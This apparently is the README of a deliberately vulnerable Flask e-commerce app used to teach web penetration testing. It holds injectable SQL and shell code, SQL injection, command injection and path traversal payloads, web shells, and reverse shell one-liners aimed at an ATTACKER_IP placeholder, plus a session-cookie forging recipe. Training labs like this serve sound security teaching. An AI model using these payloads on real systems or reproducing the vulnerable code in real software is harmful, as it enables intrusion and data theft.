# BootCamp-Lab - Intentionally Vulnerable Web Application

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Flask](https://img.shields.io/badge/Flask-2.3.0-green.svg)
![License](https://img.shields.io/badge/License-Educational-red.svg)
![Security](https://img.shields.io/badge/Security-VULNERABLE-critical.svg)

** WARNING: This application is intentionally vulnerable and should NEVER be deployed in production! **

</div>

---

##  Table of Contents

- [Overview](#overview)
- [Bootcamp Syllabus Coverage](#bootcamp-syllabus-coverage)
- [Vulnerabilities Included](#vulnerabilities-included)
- [Installation](#installation)
- [Usage](#usage)
- [Attack Scenarios](#attack-scenarios)
- [Exploitation Guides](#exploitation-guides)
- [Instructor Notes](#instructor-notes)

---

##  Overview

**BootCamp-Lab** is an intentionally vulnerable e-commerce web application built with Flask and SQLite, designed specifically for the **Offensive Security Bootcamp**. It provides a realistic environment for learning and practicing web application penetration testing techniques.

### Key Features:
- Multiple OWASP Top 10 vulnerabilities
- Realistic e-commerce application flow
- Built-in hints and exploitation guides
- Activity logging for tracking student progress
- Easy to deploy on Ubuntu Server
- Suitable for CTF-style challenges

---

##  Bootcamp Syllabus Coverage

### Phase 0: Opening (Ethics and Regulations)
The application includes warnings and educational content about ethical hacking practices.

### Phase 1: Reconnaissance & Attack Surface Mapping
**Skills Practiced:**
- Target profiling through exposed endpoints
- Service enumeration via headers and error messages
- Information disclosure through debug pages
- Network reconnaissance using built-in tools

**Vulnerable Endpoints for Recon:**
- `/about` - System information disclosure
- `/debug` - Complete application internals
- `/phpinfo` - Server configuration
- Verbose error messages on all pages

### Phase 2: Web Invasion & Application Compromise
**Skills Practiced:**
- SQL Injection (authentication bypass, data extraction)
- Command Injection (RCE through ping/DNS utilities)
- Arbitrary file upload leading to RCE
- Authentication abuse and session manipulation
- Gaining initial shell access

**Attack Vectors:**
- Login page: SQL injection authentication bypass
- Search function: UNION-based SQL injection
- File upload: Unrestricted file upload → web shell
- Ping/DNS utilities: Command injection → reverse shell

### Phase 3: Infrastructure Control & Post-Exploitation
**Skills Practiced:**
- Local enumeration after gaining shell
- Privilege escalation techniques
- Lateral movement concepts
- Persistence mechanisms
- Log analysis and covering tracks
- Attack narrative and report writing

---

##  Vulnerabilities Included

### 1. SQL Injection
**Location:** Login page (`/login`) and Search page (`/search`)

**Vulnerable Code:**
```python
# Login - Authentication Bypass
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Search - Data Extraction
sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
```

**Payloads:**
```sql
-- Authentication Bypass
admin' OR '1'='1' --
admin' --

-- Data Extraction
' UNION SELECT id,username,password,email,role FROM users--
' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--
```

### 2. Command Injection
**Location:** Ping utility (`/ping`) and DNS lookup (`/dns-lookup`)

**Vulnerable Code:**
```python
command = f"ping -c 4 {host}"
result = subprocess.check_output(command, shell=True)
```

**Payloads:**
```bash
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### 3. Arbitrary File Upload
**Location:** File upload page (`/upload`)

**Vulnerability:** No file type validation, direct execution possible

**Exploitation:**
1. Upload Python web shell
2. Upload PHP backdoor (if PHP installed)
3. Upload bash reverse shell script
4. Execute via command injection

### 4. Authentication Issues
- Plain text password storage
- No password complexity requirements
- Weak session management
- Session cookie manipulation possible

### 5. Broken Access Control
**Location:** Admin panel (`/admin`)

**Vulnerability:** Only checks `session['role']`, can be manipulated

**Exploitation:**
1. Get `SECRET_KEY` from `/debug`
2. Forge session cookie with `role='admin'`
3. Access admin panel

### 6. Information Disclosure
**Locations:**
- `/debug` - Exposes SECRET_KEY, database URI, environment variables
- `/about` - System information, environment
- Error messages - Stack traces and SQL queries
- `/phpinfo` - Server configuration

### 7. Insecure Direct Object References
- User IDs exposed in URLs
- File paths directly accessible
- No authorization checks on resources

### 8. Path Traversal
**Location:** File upload and file serving

**Payloads:**
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

---

## Installation

### Prerequisites
- Python 3.8 or higher
- Ubuntu Server (recommended) or any Linux distribution
- pip (Python package manager)

### Quick Start

1. **Clone or Download the Application:**
```bash
cd /opt
git clone <repository-url> BootCamp-Lab
cd BootCamp-Lab
```

2. **Create Virtual Environment:**
```bash
python3 -m venv venv
source venv/bin/activate
```

3. **Install Dependencies:**
```bash
pip install -r requirements.txt
```

4. **Create Environment File:**
```bash
cp .env.example .env
```

5. **Initialize Database:**
```bash
python3 app.py
# Database will be created automatically with sample data
# Ctrl+C to stop after initialization
```

6. **Run the Application:**
```bash
python3 app.py
```

The application will be available at `http://localhost:5000`

### Default Credentials

| Username | Password    | Role  |
|----------|-------------|-------|
| admin    | admin123    | admin |
| john     | password123 | user  |
| alice    | alice2023   | user  |
| bob      | qwerty      | user  |

---

## 🎮 Usage

### For Students:

1. **Start with Reconnaissance:**
   - Visit `/about` for system information
   - Check `/debug` for sensitive data
   - Examine error messages

2. **Practice SQL Injection:**
   - Try authentication bypass on `/login`
   - Extract data using `/search`

3. **Test Command Injection:**
   - Use `/ping` or `/dns-lookup`
   - Gain shell access

4. **Upload Web Shell:**
   - Use `/upload` to upload malicious files
   - Execute via command injection

5. **Privilege Escalation:**
   - Manipulate session cookies
   - Access `/admin` panel

### For Instructors:

Monitor student activity through:
- Activity logs in admin panel
- Server logs
- Database queries in console (SQLALCHEMY_ECHO=True)

---

## Attack Scenarios

### Scenario 1: Complete Compromise Chain

**Objective:** Gain admin access and establish persistence

1. **Reconnaissance:**
   ```bash
   curl http://target:5000/debug
   # Get SECRET_KEY and database info
   ```

2. **SQL Injection - User Enumeration:**
   ```
   Navigate to: /search?q=' UNION SELECT id,username,password,email,role FROM users--
   ```

3. **Authentication Bypass:**
   ```
   Username: admin' --
   Password: anything
   ```

4. **File Upload - Web Shell:**
   Create `shell.py`:
   ```python
   import os
   cmd = input()
   os.system(cmd)
   ```
   Upload to `/upload`

5. **Command Injection - Execute Shell:**
   ```
   Ping: 127.0.0.1; python3 uploads/shell.py
   ```

6. **Establish Reverse Shell:**
   ```bash
   127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   ```

### Scenario 2: Session Hijacking & Privilege Escalation

1. Get SECRET_KEY from `/debug`
2. Use Flask session decoder to read cookie
3. Modify `role` to `admin`
4. Encode new session cookie
5. Replace cookie in browser
6. Access `/admin` panel

---

## Exploitation Guides

### SQL Injection Guide

**Testing for SQLi:**
```sql
# Test with single quote
' 

# Boolean-based blind SQLi
' OR '1'='1' --
' OR '1'='2' --

# Authentication bypass
admin' OR '1'='1' --
admin' --

# UNION-based injection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

**Data Extraction:**
```sql
# Get database structure
' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--

# Extract all users
' UNION SELECT id,username,password,email,role FROM users--

# Extract admin only
' UNION SELECT id,username,password,email,role FROM users WHERE role='admin'--
```

### Command Injection Guide

**Basic Testing:**
```bash
# Command separator
127.0.0.1; whoami

# Command chaining
127.0.0.1 && id

# Command substitution
127.0.0.1 `whoami`

# Piping
127.0.0.1 | ls -la
```

**Reverse Shell Payloads:**
```bash
# Bash reverse shell
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell (if available)
127.0.0.1; nc -e /bin/bash ATTACKER_IP 4444
```

### File Upload to RCE

**Method 1: Python Web Shell**
```python
# shell.py
import os
from flask import request
cmd = request.args.get('cmd', 'whoami')
print(os.popen(cmd).read())
```

Access: `/uploads/shell.py?cmd=whoami`

**Method 2: Bash Script**
```bash
#!/bin/bash
# revshell.sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Execute via command injection:
```bash
127.0.0.1; bash uploads/revshell.sh
```

### Session Manipulation

**Using flask-unsign:**
```bash
# Install
pip install flask-unsign

# Decode session cookie
flask-unsign --decode --cookie "YOUR_SESSION_COOKIE"

# Encode new session
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}" --secret "weak_secret_key_12345"
```

---

## Instructor Notes

### Pre-Bootcamp Setup

1. **Deploy on Ubuntu Server:**
   ```bash
   # Install Python and dependencies
   sudo apt update
   sudo apt install python3 python3-pip python3-venv -y
   
   # Clone application
   cd /opt
   git clone <repo> BootCamp-Lab
   cd BootCamp-Lab
   
   # Setup
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   
   # Run as service
   python3 app.py
   ```

2. **Network Setup:**
   - Ensure students can access server IP
   - Consider isolated network for safety
   - Monitor traffic if needed

3. **Reset Between Sessions:**
   ```bash
   # Delete database
   rm instance/vulnerable_app.db
   
   # Clear uploads
   rm -rf uploads/*
   
   # Restart application
   python3 app.py
   ```

### Teaching Points

**Phase 1 - Reconnaissance:**
- Emphasize information gathering before attacking
- Teach students to enumerate endpoints
- Show how verbose errors help attackers
- Demonstrate passive vs active reconnaissance

**Phase 2 - Exploitation:**
- Start with manual exploitation before tools
- Explain each vulnerability's root cause
- Show how vulnerabilities chain together
- Practice writing exploitation scripts

**Phase 3 - Post-Exploitation:**
- Teach log analysis and cleanup
- Demonstrate persistence techniques
- Practice lateral movement concepts
- Focus on professional reporting

### Assessment Ideas

1. **CTF-Style Flags:**
   - Hide flags in database
   - Require multi-step exploitation
   - Award points for different vulnerabilities

2. **Report Writing:**
   - Require professional penetration test report
   - Include executive summary
   - Technical details with PoC
   - Remediation recommendations

3. **Time-Boxed Challenges:**
   - 30 min: Find and exploit SQL injection
   - 45 min: Gain shell access
   - 60 min: Full system compromise

---

##  Security Warnings

###  CRITICAL WARNINGS

1. **NEVER deploy this application on the internet**
2. **NEVER use in production environment**
3. **Only use in isolated lab networks**
4. **Ensure proper network segmentation**
5. **Delete immediately after training**

### Recommended Lab Environment

```
[Internet] ← Firewall → [Lab Network]
                            ├── Student machines
                            ├── BootCamp-Lab server (isolated VLAN)
                            └── Monitoring/Logging server
```

---

##  License

This software is provided for **EDUCATIONAL PURPOSES ONLY**. 

The authors are NOT responsible for any misuse or damage caused by this application.

---

##  Contributing

If you find bugs or want to add more vulnerabilities, feel free to contribute!

---

##  Support

For bootcamp instructors needing assistance, please contact the development team.

---

##  Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

<div align="center">

**Happy Hacking! 🏴‍☠️**

*Remember: With great power comes great responsibility.*

</div>
